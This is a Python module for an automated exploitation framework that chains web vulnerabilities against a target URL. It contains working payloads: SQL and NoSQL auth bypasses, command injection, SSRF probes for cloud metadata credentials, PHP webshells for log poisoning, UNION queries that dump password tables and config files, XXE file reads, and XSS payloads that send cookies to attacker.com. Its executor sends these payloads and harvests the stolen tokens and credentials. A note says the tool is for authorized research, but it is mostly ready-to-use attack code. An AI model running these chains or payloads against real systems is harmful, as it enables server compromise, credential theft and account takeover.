"""
Vulnerability Chaining & Multi-Step Exploitation Module.

Implements automated vulnerability chaining:
- Auth Bypass → RCE chains
- SSRF → Internal Service Access
- LFI → Log Poisoning → RCE
- SQLi → File Read → Credential Theft

For security research only - requires proper authorization.
"""
from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Callable, Optional

logger = logging.getLogger(__name__)


class ChainStep(Enum):
    """Types of chain steps."""
    AUTH_BYPASS = "auth_bypass"
    TOKEN_STEAL = "token_steal"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    SSRF = "ssrf"
    LFI = "lfi"
    RCE = "rce"
    SQLI = "sqli"
    FILE_READ = "file_read"
    FILE_WRITE = "file_write"
    CREDENTIAL_ACCESS = "credential_access"
    INTERNAL_SERVICE = "internal_service"
    DATA_EXFIL = "data_exfil"


class ChainStatus(Enum):
    """Chain execution status."""
    PENDING = "pending"
    IN_PROGRESS = "in_progress"
    SUCCESS = "success"
    PARTIAL = "partial"
    FAILED = "failed"
    BLOCKED = "blocked"


@dataclass
class ChainStepResult:
    """Result of a single chain step."""
    step_type: ChainStep
    step_name: str
    payload: str
    target_url: str
    success: bool
    output: str
    artifacts: dict[str, Any] = field(default_factory=dict)  # e.g., {"token": "xyz"}
    evidence: str = ""
    timestamp: datetime = field(default_factory=datetime.now)
    next_step_input: dict[str, Any] = field(default_factory=dict)


@dataclass
class VulnChain:
    """Vulnerability chain definition."""
    chain_id: str
    name: str
    description: str
    steps: list[ChainStep]
    payloads: dict[ChainStep, list[str]]
    preconditions: list[str]  # Required vulns before chain
    success_criteria: str
    risk_level: str  # "critical", "high", "medium"
    estimated_impact: str


@dataclass
class ChainExecutionResult:
    """Result of chain execution."""
    chain_id: str
    chain_name: str
    status: ChainStatus
    steps_completed: int
    steps_total: int
    step_results: list[ChainStepResult]
    final_impact: str
    evidence_hash: str
    started_at: datetime
    completed_at: datetime = None
    error: str = ""


class VulnChainLibrary:
    """
    Library of pre-defined vulnerability chains.
    
    Contains common attack patterns for automated testing.
    """
    
    CHAINS: dict[str, VulnChain] = {
        # Auth Bypass to Admin RCE
        "auth_bypass_rce": VulnChain(
            chain_id="auth_bypass_rce",
            name="Auth Bypass → Admin RCE",
            description="Bypass authentication to gain admin access, then exploit admin RCE vulnerability",
            steps=[
                ChainStep.AUTH_BYPASS,
                ChainStep.PRIVILEGE_ESCALATION,
                ChainStep.RCE
            ],
            payloads={
                ChainStep.AUTH_BYPASS: [
                    '{"username": {"$ne": null}, "password": {"$ne": null}}',
                    "' OR '1'='1'-- -",
                    "admin'--",
                ],
                ChainStep.PRIVILEGE_ESCALATION: [
                    '{"role": "admin"}',
                    '{"isAdmin": true}',
                    'admin=true',
                ],
                ChainStep.RCE: [
                    "; id",
                    "| whoami",
                    "`id`",
                ]
            },
            preconditions=["nosql_injection", "sqli", "auth_bypass"],
            success_criteria="Command execution confirmed with admin privileges",
            risk_level="critical",
            estimated_impact="Full system compromise"
        ),
        
        # SSRF to Internal Service
        "ssrf_internal": VulnChain(
            chain_id="ssrf_internal",
            name="SSRF → Internal Service Access",
            description="Use SSRF to access internal services (metadata, databases)",
            steps=[
                ChainStep.SSRF,
                ChainStep.INTERNAL_SERVICE,
                ChainStep.CREDENTIAL_ACCESS
            ],
            payloads={
                ChainStep.SSRF: [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://127.0.0.1:6379/",
                    "http://localhost:3306/",
                    "http://[::1]:8080/",
                    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a",
                ],
                ChainStep.INTERNAL_SERVICE: [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://127.0.0.1:6379/CONFIG%20GET%20*",
                    "dict://127.0.0.1:6379/INFO",
                ],
                ChainStep.CREDENTIAL_ACCESS: [
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
                    "http://169.254.169.254/latest/user-data",
                ]
            },
            preconditions=["ssrf"],
            success_criteria="Internal service accessed or credentials retrieved",
            risk_level="critical",
            estimated_impact="Cloud infrastructure compromise"
        ),
        
        # LFI to RCE via Log Poisoning
        "lfi_log_poison_rce": VulnChain(
            chain_id="lfi_log_poison_rce",
            name="LFI → Log Poisoning → RCE",
            description="Use LFI to poison logs, then include poisoned log for RCE",
            steps=[
                ChainStep.LFI,
                ChainStep.FILE_READ,
                ChainStep.FILE_WRITE,
                ChainStep.RCE
            ],
            payloads={
                ChainStep.LFI: [
                    "../../../var/log/apache2/access.log",
                    "../../../var/log/nginx/access.log",
                    "../../../var/log/httpd/access_log",
                ],
                ChainStep.FILE_READ: [
                    "php://filter/convert.base64-encode/resource=/etc/passwd",
                    "../../../proc/self/environ",
                ],
                ChainStep.FILE_WRITE: [
                    # Poison via User-Agent
                    "<?php system($_GET['cmd']); ?>",
                    "<?=`$_GET[0]`?>",
                ],
                ChainStep.RCE: [
                    "../../../var/log/apache2/access.log&cmd=id",
                    "../../../var/log/nginx/access.log&cmd=whoami",
                ]
            },
            preconditions=["lfi"],
            success_criteria="Code execution via log inclusion",
            risk_level="critical",
            estimated_impact="Server compromise"
        ),
        
        # SQLi to Credential Theft
        "sqli_credential_theft": VulnChain(
            chain_id="sqli_credential_theft",
            name="SQLi → File Read → Credential Theft",
            description="Exploit SQLi to read files and steal credentials",
            steps=[
                ChainStep.SQLI,
                ChainStep.FILE_READ,
                ChainStep.CREDENTIAL_ACCESS,
                ChainStep.DATA_EXFIL
            ],
            payloads={
                ChainStep.SQLI: [
                    "' UNION SELECT NULL,load_file('/etc/passwd'),NULL-- -",
                    "' UNION SELECT NULL,@@version,NULL-- -",
                ],
                ChainStep.FILE_READ: [
                    "' UNION SELECT NULL,load_file('/var/www/html/config.php'),NULL-- -",
                    "' UNION SELECT NULL,load_file('/var/www/html/.env'),NULL-- -",
                    "' UNION SELECT NULL,load_file('/app/config/database.yml'),NULL-- -",
                ],
                ChainStep.CREDENTIAL_ACCESS: [
                    "' UNION SELECT username,password,NULL FROM users-- -",
                    "' UNION SELECT email,password_hash,role FROM admins-- -",
                ],
                ChainStep.DATA_EXFIL: [
                    "' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -",
                ]
            },
            preconditions=["sqli"],
            success_criteria="Database credentials or user data extracted",
            risk_level="high",
            estimated_impact="Data breach"
        ),
        
        # Token Steal to Account Takeover
        "token_ato": VulnChain(
            chain_id="token_ato",
            name="Token Theft → Account Takeover",
            description="Steal authentication token and take over accounts",
            steps=[
                ChainStep.TOKEN_STEAL,
                ChainStep.AUTH_BYPASS,
                ChainStep.PRIVILEGE_ESCALATION
            ],
            payloads={
                ChainStep.TOKEN_STEAL: [
                    "<script>fetch('//attacker.com?c='+document.cookie)</script>",
                    "<img src=x onerror=this.src='//attacker.com?c='+document.cookie>",
                ],
                ChainStep.AUTH_BYPASS: [
                    "Authorization: Bearer {stolen_token}",
                    "Cookie: session={stolen_token}",
                ],
                ChainStep.PRIVILEGE_ESCALATION: [
                    '{"userId": "admin"}',
                    '{"role": "administrator"}',
                ]
            },
            preconditions=["xss", "session_fixation"],
            success_criteria="Account access with stolen credentials",
            risk_level="high",
            estimated_impact="Account takeover"
        ),
        
        # XXE to Internal Network Scan
        "xxe_internal_scan": VulnChain(
            chain_id="xxe_internal_scan",
            name="XXE → Internal Network Discovery",
            description="Use XXE to scan internal network and discover services",
            steps=[
                ChainStep.FILE_READ,
                ChainStep.SSRF,
                ChainStep.INTERNAL_SERVICE
            ],
            payloads={
                ChainStep.FILE_READ: [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                ],
                ChainStep.SSRF: [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]><foo>&xxe;</foo>',
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1:8080/">]><foo>&xxe;</foo>',
                ],
                ChainStep.INTERNAL_SERVICE: [
                    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                ]
            },
            preconditions=["xxe"],
            success_criteria="Internal network services discovered",
            risk_level="high",
            estimated_impact="Internal network exposure"
        ),
    }
    
    @classmethod
    def get_chain(cls, chain_id: str) -> Optional[VulnChain]:
        """Get chain definition by ID."""
        return cls.CHAINS.get(chain_id)
    
    @classmethod
    def get_chains_for_vuln(cls, vuln_type: str) -> list[VulnChain]:
        """Get all chains that can start from a given vulnerability type."""
        chains = []
        for chain in cls.CHAINS.values():
            if vuln_type.lower() in [p.lower() for p in chain.preconditions]:
                chains.append(chain)
        return chains
    
    @classmethod
    def list_chains(cls) -> list[dict]:
        """List all available chains."""
        return [
            {
                "id": c.chain_id,
                "name": c.name,
                "description": c.description,
                "risk_level": c.risk_level,
                "steps": [s.value for s in c.steps],
                "preconditions": c.preconditions
            }
            for c in cls.CHAINS.values()
        ]


class SessionManager:
    """
    Manages sessions and tokens across chain steps.
    
    Handles:
    - Session cookie persistence
    - Token extraction and reuse
    - CSRF token management
    - Session state tracking
    """
    
    def __init__(self):
        self.sessions: dict[str, dict] = {}  # session_id -> session data
        self.tokens: dict[str, str] = {}  # token_type -> token_value
        self.cookies: dict[str, str] = {}
        self.csrf_tokens: dict[str, str] = {}
    
    def create_session(self, target_url: str) -> str:
        """Create new session for target."""
        session_id = hashlib.sha256(f"{target_url}{time.time()}".encode()).hexdigest()[:16]
        self.sessions[session_id] = {
            "target": target_url,
            "created": datetime.now().isoformat(),
            "cookies": {},
            "tokens": {},
            "headers": {}
        }
        return session_id
    
    def update_session(
        self,
        session_id: str,
        cookies: dict = None,
        tokens: dict = None,
        headers: dict = None
    ):
        """Update session with new data."""
        if session_id not in self.sessions:
            return
        
        if cookies:
            self.sessions[session_id]["cookies"].update(cookies)
            self.cookies.update(cookies)
        
        if tokens:
            self.sessions[session_id]["tokens"].update(tokens)
            self.tokens.update(tokens)
        
        if headers:
            self.sessions[session_id]["headers"].update(headers)
    
    def extract_tokens_from_response(
        self,
        body: str,
        headers: dict[str, str]
    ) -> dict[str, str]:
        """Extract tokens from response."""
        tokens = {}
        
        # JWT in response body
        jwt_pattern = r'["\']?(token|jwt|access_token|id_token)["\']?\s*[:\=]\s*["\']?([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)["\']?'
        for match in re.finditer(jwt_pattern, body, re.IGNORECASE):
            tokens[match.group(1).lower()] = match.group(2)
        
        # Bearer token in headers
        if "Authorization" in headers:
            auth = headers["Authorization"]
            if auth.startswith("Bearer "):
                tokens["bearer"] = auth[7:]
        
        # CSRF tokens
        csrf_patterns = [
            r'name=["\']?csrf[_-]?token["\']?\s+value=["\']?([^"\'>\s]+)',
            r'name=["\']?_token["\']?\s+value=["\']?([^"\'>\s]+)',
            r'csrf[_-]?token["\']?\s*[:\=]\s*["\']?([^"\'>\s,}]+)',
        ]
        for pattern in csrf_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                tokens["csrf"] = match.group(1)
        
        # Session tokens in cookies
        set_cookie = headers.get("Set-Cookie", "")
        cookie_patterns = [
            r'(session|sess|sid|PHPSESSID|JSESSIONID)=([^;]+)',
        ]
        for pattern in cookie_patterns:
            match = re.search(pattern, set_cookie, re.IGNORECASE)
            if match:
                tokens[match.group(1).lower()] = match.group(2)
        
        return tokens
    
    def get_auth_headers(self, session_id: str = None) -> dict[str, str]:
        """Get authentication headers for request."""
        headers = {}
        
        # Add bearer token if available
        if "bearer" in self.tokens:
            headers["Authorization"] = f"Bearer {self.tokens['bearer']}"
        elif "token" in self.tokens:
            headers["Authorization"] = f"Bearer {self.tokens['token']}"
        elif "jwt" in self.tokens:
            headers["Authorization"] = f"Bearer {self.tokens['jwt']}"
        
        # Add session cookies
        if self.cookies:
            cookie_str = "; ".join(f"{k}={v}" for k, v in self.cookies.items())
            headers["Cookie"] = cookie_str
        
        # Add CSRF token
        if "csrf" in self.tokens:
            headers["X-CSRF-Token"] = self.tokens["csrf"]
        
        return headers
    
    def refresh_token(self, refresh_endpoint: str, make_request: Callable) -> bool:
        """Refresh authentication token."""
        if "refresh_token" not in self.tokens:
            return False
        
        # This would make actual refresh request
        # Implementation depends on target's refresh mechanism
        return False


class ChainExecutor:
    """
    Executes vulnerability chains step by step.
    
    Features:
    - Step-by-step execution with validation
    - Artifact passing between steps
    - Rollback on failure
    - Evidence collection
    """
    
    def __init__(
        self,
        make_request: Callable,
        session_manager: SessionManager = None,
        verbose: bool = False
    ):
        self.make_request = make_request
        self.session_manager = session_manager or SessionManager()
        self.verbose = verbose
        self.execution_history: list[ChainExecutionResult] = []
    
    async def execute_chain(
        self,
        chain: VulnChain,
        target_url: str,
        initial_artifacts: dict[str, Any] = None
    ) -> ChainExecutionResult:
        """
        Execute a vulnerability chain.
        
        Args:
            chain: Chain definition to execute
            target_url: Target URL
            initial_artifacts: Initial data (e.g., known vuln payloads)
        
        Returns:
            ChainExecutionResult with all step results
        """
        result = ChainExecutionResult(
            chain_id=chain.chain_id,
            chain_name=chain.name,
            status=ChainStatus.IN_PROGRESS,
            steps_completed=0,
            steps_total=len(chain.steps),
            step_results=[],
            final_impact="",
            evidence_hash="",
            started_at=datetime.now()
        )
        
        # Create session for this chain
        session_id = self.session_manager.create_session(target_url)
        
        # Track artifacts between steps
        artifacts = initial_artifacts or {}
        
        try:
            for i, step in enumerate(chain.steps):
                if self.verbose:
                    logger.info(f"Executing chain step {i+1}/{len(chain.steps)}: {step.value}")
                
                # Get payloads for this step
                payloads = chain.payloads.get(step, [])
                
                # Execute step
                step_result = await self._execute_step(
                    step=step,
                    target_url=target_url,
                    payloads=payloads,
                    artifacts=artifacts,
                    session_id=session_id
                )
                
                result.step_results.append(step_result)
                
                if step_result.success:
                    result.steps_completed += 1
                    # Pass artifacts to next step
                    artifacts.update(step_result.artifacts)
                    artifacts.update(step_result.next_step_input)
                else:
                    # Step failed - check if we should continue
                    if step in [ChainStep.AUTH_BYPASS, ChainStep.RCE]:
                        # Critical step - stop chain
                        result.status = ChainStatus.FAILED
                        result.error = f"Critical step {step.value} failed"
                        break
                    else:
                        # Non-critical - continue but mark as partial
                        result.status = ChainStatus.PARTIAL
            
            # Determine final status
            if result.steps_completed == result.steps_total:
                result.status = ChainStatus.SUCCESS
                result.final_impact = chain.estimated_impact
            elif result.steps_completed > 0:
                result.status = ChainStatus.PARTIAL
                result.final_impact = f"Partial: {result.steps_completed}/{result.steps_total} steps"
            else:
                result.status = ChainStatus.FAILED
            
            # Generate evidence hash
            evidence_data = json.dumps([
                {
                    "step": r.step_type.value,
                    "success": r.success,
                    "evidence": r.evidence
                }
                for r in result.step_results
            ])
            result.evidence_hash = hashlib.sha256(evidence_data.encode()).hexdigest()
            
        except Exception as e:
            result.status = ChainStatus.FAILED
            result.error = str(e)
            logger.error(f"Chain execution failed: {e}")
        
        result.completed_at = datetime.now()
        self.execution_history.append(result)
        
        return result
    
    async def _execute_step(
        self,
        step: ChainStep,
        target_url: str,
        payloads: list[str],
        artifacts: dict[str, Any],
        session_id: str
    ) -> ChainStepResult:
        """Execute a single chain step."""
        result = ChainStepResult(
            step_type=step,
            step_name=step.value,
            payload="",
            target_url=target_url,
            success=False,
            output=""
        )
        
        # Get auth headers from session
        headers = self.session_manager.get_auth_headers(session_id)
        
        # Substitute artifacts in payloads
        processed_payloads = []
        for payload in payloads:
            processed = payload
            for key, value in artifacts.items():
                processed = processed.replace(f"{{{key}}}", str(value))
            processed_payloads.append(processed)
        
        # Try each payload
        for payload in processed_payloads:
            try:
                response = await self._send_payload(
                    step=step,
                    target_url=target_url,
                    payload=payload,
                    headers=headers
                )
                
                # Validate step success
                success, evidence, new_artifacts = self._validate_step(
                    step=step,
                    payload=payload,
                    response=response,
                    artifacts=artifacts
                )
                
                if success:
                    result.success = True
                    result.payload = payload
                    result.output = response.get("body", "")[:1000]
                    result.evidence = evidence
                    result.artifacts = new_artifacts
                    
                    # Extract tokens for session
                    tokens = self.session_manager.extract_tokens_from_response(
                        response.get("body", ""),
                        response.get("headers", {})
                    )
                    if tokens:
                        self.session_manager.update_session(session_id, tokens=tokens)
                        result.next_step_input["tokens"] = tokens
                    
                    break
                    
            except Exception as e:
                logger.warning(f"Step {step.value} payload failed: {e}")
                continue
        
        return result
    
    async def _send_payload(
        self,
        step: ChainStep,
        target_url: str,
        payload: str,
        headers: dict[str, str]
    ) -> dict:
        """Send payload for step."""
        # Determine request method and data based on step type
        method = "POST"
        data = None
        params = None
        
        if step in [ChainStep.LFI, ChainStep.FILE_READ]:
            method = "GET"
            params = {"file": payload, "path": payload, "page": payload}
        elif step == ChainStep.SSRF:
            method = "POST"
            data = {"url": payload, "target": payload, "path": payload}
        elif step in [ChainStep.SQLI, ChainStep.AUTH_BYPASS]:
            method = "POST"
            try:
                data = json.loads(payload)
            except json.JSONDecodeError:
                data = {"input": payload}
        elif step == ChainStep.RCE:
            method = "POST"
            data = {"cmd": payload, "command": payload, "exec": payload}
        else:
            data = {"payload": payload}
        
        # Make request (this would use the actual make_request function)
        return await self.make_request(
            method=method,
            url=target_url,
            headers=headers,
            data=data,
            params=params
        )
    
    def _validate_step(
        self,
        step: ChainStep,
        payload: str,
        response: dict,
        artifacts: dict
    ) -> tuple[bool, str, dict]:
        """
        Validate step success.
        
        Returns (success, evidence, new_artifacts)
        """
        body = response.get("body", "")
        status = response.get("status_code", 0)
        headers = response.get("headers", {})
        new_artifacts = {}
        
        # Step-specific validation
        if step == ChainStep.AUTH_BYPASS:
            # Look for auth success indicators
            success_indicators = ["token", "session", "welcome", "dashboard", "logged in"]
            if any(ind in body.lower() for ind in success_indicators) or status == 200:
                # Extract token if present
                token_match = re.search(r'"token"\s*:\s*"([^"]+)"', body)
                if token_match:
                    new_artifacts["auth_token"] = token_match.group(1)
                return True, "Auth bypass successful", new_artifacts
        
        elif step == ChainStep.RCE:
            # Look for command output
            rce_indicators = ["uid=", "gid=", "root", "www-data", "apache", "nginx"]
            if any(ind in body.lower() for ind in rce_indicators):
                return True, f"RCE confirmed: {body[:100]}", {}
        
        elif step == ChainStep.SSRF:
            # Check for internal responses
            ssrf_indicators = ["169.254.169.254", "localhost", "127.0.0.1", "internal"]
            if any(ind in body.lower() for ind in ssrf_indicators):
                # Extract any credentials found
                cred_match = re.search(r'(aws_access_key|secret|password)\s*[=:]\s*"?([^"\s]+)', body, re.I)
                if cred_match:
                    new_artifacts[cred_match.group(1).lower()] = cred_match.group(2)
                return True, "SSRF successful - internal access", new_artifacts
        
        elif step == ChainStep.LFI:
            # Check for file content
            lfi_indicators = ["root:x:0:0", "[fonts]", "<?php", "#!/"]
            if any(ind in body for ind in lfi_indicators):
                return True, f"LFI successful: {body[:100]}", {}
        
        elif step == ChainStep.FILE_READ:
            # Check for sensitive file content
            if len(body) > 100 and status == 200:
                # Extract any passwords/credentials
                cred_patterns = [
                    r'(password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\']+)',
                    r'(db_pass|dbpass|database_password)\s*[=:]\s*["\']?([^\s"\']+)',
                ]
                for pattern in cred_patterns:
                    match = re.search(pattern, body, re.I)
                    if match:
                        new_artifacts[match.group(1).lower()] = match.group(2)
                return True, "File read successful", new_artifacts
        
        elif step == ChainStep.CREDENTIAL_ACCESS:
            # Check for credential patterns
            if re.search(r'\b[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+\b', body):
                return True, "Credentials extracted", {}
            if re.search(r'(password|secret|token)\s*[=:]\s*\S+', body, re.I):
                return True, "Credentials found", {}
        
        elif step == ChainStep.INTERNAL_SERVICE:
            # Check for internal service responses
            if status == 200 and len(body) > 0:
                return True, "Internal service accessed", {}
        
        return False, "", {}


class ParallelEndpointTester:
    """
    Parallel testing of multiple endpoints.
    
    Features:
    - Concurrent endpoint testing
    - Rate limit aware
    - Result aggregation
    """
    
    def __init__(
        self,
        make_request: Callable,
        max_concurrent: int = 10,
        rate_limit_delay: float = 0.1
    ):
        self.make_request = make_request
        self.max_concurrent = max_concurrent
        self.rate_limit_delay = rate_limit_delay
        self.semaphore = asyncio.Semaphore(max_concurrent)
    
    async def test_endpoints(
        self,
        endpoints: list[str],
        payloads: list[str],
        test_type: str = "sqli"
    ) -> list[dict]:
        """Test multiple endpoints in parallel."""
        tasks = []
        
        for endpoint in endpoints:
            for payload in payloads:
                task = self._test_single(endpoint, payload, test_type)
                tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filter successful results
        return [r for r in results if isinstance(r, dict) and r.get("vulnerable")]
    
    async def _test_single(
        self,
        endpoint: str,
        payload: str,
        test_type: str
    ) -> dict:
        """Test single endpoint with payload."""
        async with self.semaphore:
            await asyncio.sleep(self.rate_limit_delay)
            
            try:
                response = await self.make_request(
                    method="POST",
                    url=endpoint,
                    data={"input": payload}
                )
                
                # Basic vulnerability check
                vulnerable = self._check_vulnerability(
                    test_type,
                    response.get("body", ""),
                    response.get("status_code", 0)
                )
                
                return {
                    "endpoint": endpoint,
                    "payload": payload,
                    "test_type": test_type,
                    "vulnerable": vulnerable,
                    "response_code": response.get("status_code")
                }
            
            except Exception as e:
                return {
                    "endpoint": endpoint,
                    "payload": payload,
                    "error": str(e),
                    "vulnerable": False
                }
    
    def _check_vulnerability(
        self,
        test_type: str,
        body: str,
        status: int
    ) -> bool:
        """Quick vulnerability check."""
        indicators = {
            "sqli": ["sql syntax", "mysql", "sqlite", "postgresql", "ora-"],
            "xss": ["<script>", "onerror=", "onload="],
            "rce": ["uid=", "gid=", "root:", "www-data"],
            "lfi": ["root:x:0", "[fonts]", "<?php"],
        }
        
        check_patterns = indicators.get(test_type, [])
        body_lower = body.lower()
        
        return any(p in body_lower for p in check_patterns)


# Export classes
__all__ = [
    "ChainStep",
    "ChainStatus",
    "ChainStepResult",
    "VulnChain",
    "ChainExecutionResult",
    "VulnChainLibrary",
    "SessionManager",
    "ChainExecutor",
    "ParallelEndpointTester",
]
